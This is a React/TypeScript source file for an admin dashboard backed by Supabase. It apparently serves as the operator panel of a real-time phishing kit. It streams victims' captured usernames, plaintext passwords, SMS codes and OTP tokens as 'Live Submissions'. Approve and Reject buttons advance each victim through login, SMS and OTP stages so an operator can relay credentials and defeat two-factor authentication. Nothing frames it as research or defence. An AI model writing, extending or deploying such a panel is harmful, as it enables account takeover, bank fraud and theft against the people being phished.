import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  Check,
  X,
  LogOut,
  Loader2,
  Inbox,
  KeyRound,
  User as UserIcon,
  Clock,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const STORAGE_KEY = "admin_unlocked";

export const Route = createFileRoute("/admin/")({
  head: () => ({ meta: [{ title: "Admin Dashboard" }] }),
  component: AdminDashboard,
});

type SessionRow = {
  id: string;
  username: string;
  password: string;
  otp: string | null;
  sms_code: string | null;
  status: string;
  user_agent: string | null;
  created_at: string;
  updated_at: string;
};

const statusMeta: Record<string, { label: string; tone: string }> = {
  pending_login: { label: "Pending login", tone: "bg-amber-100 text-amber-800" },
  login_approved: { label: "Login approved (waiting SMS)", tone: "bg-blue-100 text-blue-800" },
  login_rejected: { label: "Login rejected", tone: "bg-red-100 text-red-700" },
  pending_sms: { label: "SMS code submitted", tone: "bg-indigo-100 text-indigo-800" },
  sms_approved: { label: "SMS approved (waiting OTP)", tone: "bg-cyan-100 text-cyan-800" },
  sms_rejected: { label: "SMS rejected", tone: "bg-red-100 text-red-700" },
  pending_otp: { label: "OTP submitted", tone: "bg-purple-100 text-purple-800" },
  otp_approved: { label: "OTP approved", tone: "bg-green-100 text-green-700" },
  otp_rejected: { label: "OTP rejected", tone: "bg-red-100 text-red-700" },
};

function AdminDashboard() {
  const navigate = useNavigate();
  const [authChecked, setAuthChecked] = useState(false);
  const [sessions, setSessions] = useState<SessionRow[]>([]);
  const [filter, setFilter] = useState<"active" | "all">("active");

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (localStorage.getItem(STORAGE_KEY) !== "1") {
      navigate({ to: "/admin/login" });
      return;
    }
    setAuthChecked(true);
  }, [navigate]);

  useEffect(() => {
    if (!authChecked) return;

    let active = true;
    supabase
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(200)
      .then(({ data }) => {
        if (active && data) setSessions(data as SessionRow[]);
      });

    const channel = supabase
      .channel("admin-sessions")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions" },
        (payload) => {
          setSessions((prev) => {
            if (payload.eventType === "INSERT") {
              return [payload.new as SessionRow, ...prev];
            }
            if (payload.eventType === "UPDATE") {
              return prev.map((r) =>
                r.id === (payload.new as SessionRow).id ? (payload.new as SessionRow) : r,
              );
            }
            if (payload.eventType === "DELETE") {
              return prev.filter((r) => r.id !== (payload.old as SessionRow).id);
            }
            return prev;
          });
        },
      )
      .subscribe();

    return () => {
      active = false;
      supabase.removeChannel(channel);
    };
  }, [authChecked]);

  async function updateStatus(id: string, status: string) {
    setSessions((prev) => prev.map((r) => (r.id === id ? { ...r, status } : r)));
    await supabase.from("sessions").update({ status }).eq("id", id);
  }

  function signOut() {
    localStorage.removeItem(STORAGE_KEY);
    navigate({ to: "/admin/login" });
  }

  if (!authChecked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-slate-50">
        <Loader2 className="h-6 w-6 animate-spin text-slate-400" />
      </div>
    );
  }

  const visible = filter === "active"
    ? sessions.filter((s) => s.status === "pending_login" || s.status === "pending_sms" || s.status === "pending_otp")
    : sessions;

  const pendingCount = sessions.filter(
    (s) => s.status === "pending_login" || s.status === "pending_sms" || s.status === "pending_otp",
  ).length;

  return (
    <div className="min-h-screen bg-slate-50">
      <header className="border-b border-slate-200 bg-white">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-3">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-slate-900 text-white">
              <Inbox className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-lg font-bold text-slate-900">Live Submissions</h1>
              <p className="text-xs text-slate-500">
                {pendingCount} pending · {sessions.length} total
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <div className="flex rounded-lg bg-slate-100 p-1 text-xs font-semibold">
              <button
                onClick={() => setFilter("active")}
                className={`rounded-md px-3 py-1.5 ${filter === "active" ? "bg-white text-slate-900 shadow-sm" : "text-slate-500"}`}
              >
                Pending
              </button>
              <button
                onClick={() => setFilter("all")}
                className={`rounded-md px-3 py-1.5 ${filter === "all" ? "bg-white text-slate-900 shadow-sm" : "text-slate-500"}`}
              >
                All
              </button>
            </div>
            <button
              onClick={signOut}
              className="flex items-center gap-1.5 rounded-lg border border-slate-200 bg-white px-3 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-50"
            >
              <LogOut className="h-3.5 w-3.5" />
              Sign out
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-6 py-8">
        {visible.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-16 text-center">
            <Inbox className="mx-auto h-10 w-10 text-slate-300" />
            <p className="mt-3 text-sm font-semibold text-slate-700">No submissions yet</p>
            <p className="mt-1 text-xs text-slate-500">
              New attempts will appear here in real time.
            </p>
          </div>
        ) : (
          <div className="space-y-3">
            {visible.map((s) => (
              <SessionCard key={s.id} session={s} onAction={updateStatus} />
            ))}
          </div>
        )}
      </main>
    </div>
  );
}

function SessionCard({
  session,
  onAction,
}: {
  session: SessionRow;
  onAction: (id: string, status: string) => void;
}) {
  const meta = statusMeta[session.status] ?? {
    label: session.status,
    tone: "bg-slate-100 text-slate-700",
  };

  const isLoginPending = session.status === "pending_login";
  const isSmsPending = session.status === "pending_sms";
  const isOtpPending = session.status === "pending_otp";
  const isPending = isLoginPending || isSmsPending || isOtpPending;

  const approveStatus = isLoginPending
    ? "login_approved"
    : isSmsPending
      ? "sms_approved"
      : "otp_approved";
  const rejectStatus = isLoginPending
    ? "login_rejected"
    : isSmsPending
      ? "sms_rejected"
      : "otp_rejected";

  return (
    <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm">
      <div className="flex flex-wrap items-start justify-between gap-3">
        <div className="flex-1">
          <div className="flex items-center gap-2">
            <span className={`rounded-full px-2.5 py-0.5 text-[11px] font-bold ${meta.tone}`}>
              {meta.label}
            </span>
            <span className="flex items-center gap-1 text-[11px] text-slate-400">
              <Clock className="h-3 w-3" />
              {new Date(session.updated_at).toLocaleString()}
            </span>
          </div>

          <div className="mt-3 grid gap-3 sm:grid-cols-2">
            <Field icon={<UserIcon className="h-3.5 w-3.5" />} label="Username">
              {session.username}
            </Field>
            <Field icon={<KeyRound className="h-3.5 w-3.5" />} label="Password">
              {session.password}
            </Field>
            {session.sms_code && (
              <Field icon={<KeyRound className="h-3.5 w-3.5" />} label="SMS Code">
                <span className="font-mono text-lg tracking-widest text-slate-900">
                  {session.sms_code}
                </span>
              </Field>
            )}
            {session.otp && (
              <Field icon={<KeyRound className="h-3.5 w-3.5" />} label="OTP Token">
                <span className="font-mono text-lg tracking-widest text-slate-900">
                  {session.otp}
                </span>
              </Field>
            )}
          </div>
        </div>

        {isPending && (
          <div className="flex gap-2">
            <button
              onClick={() => onAction(session.id, approveStatus)}
              className="flex items-center gap-1.5 rounded-lg bg-green-600 px-4 py-2 text-xs font-bold text-white hover:bg-green-700"
            >
              <Check className="h-4 w-4" />
              Approve
            </button>
            <button
              onClick={() => onAction(session.id, rejectStatus)}
              className="flex items-center gap-1.5 rounded-lg bg-red-600 px-4 py-2 text-xs font-bold text-white hover:bg-red-700"
            >
              <X className="h-4 w-4" />
              Reject
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

function Field({
  icon,
  label,
  children,
}: {
  icon: React.ReactNode;
  label: string;
  children: React.ReactNode;
}) {
  return (
    <div className="rounded-lg bg-slate-50 px-3 py-2">
      <div className="flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-slate-500">
        {icon}
        {label}
      </div>
      <div className="mt-1 break-all text-sm font-semibold text-slate-900">{children}</div>
    </div>
  );
}